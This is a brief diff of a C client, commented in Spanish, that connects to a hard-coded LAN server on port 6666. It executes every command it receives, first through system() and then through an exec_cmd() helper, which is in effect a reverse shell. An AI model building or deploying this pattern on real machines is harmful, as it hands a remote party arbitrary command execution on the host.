@@ -9,7 +9,7 @@ int main (int argc, char *argv[]){
   }
   
   puerto = 6666;
-  ip = "192.168.1.67";
+  ip = "192.168.1.66";
   struct sockaddr_in addin;
   printf("Conectando al servidor...\n");
   sckdes=crear_socket_cliente(puerto, ip, (struct sockaddr *)&addin);
@@ -19,11 +19,8 @@ int main (int argc, char *argv[]){
     char comando[MAX_LINE];
     while(leer_socket(sckdes,comando,MAX_LINE) > 1)
     {
-      
-      printf(">> %s",comando);
-      // Ejecución del comando
-      system(comando);
-      // Envío de respuesta al servidor
+      printf(">> %s\n",comando);
+      exec_cmd(comando);
     }
   }else
   {
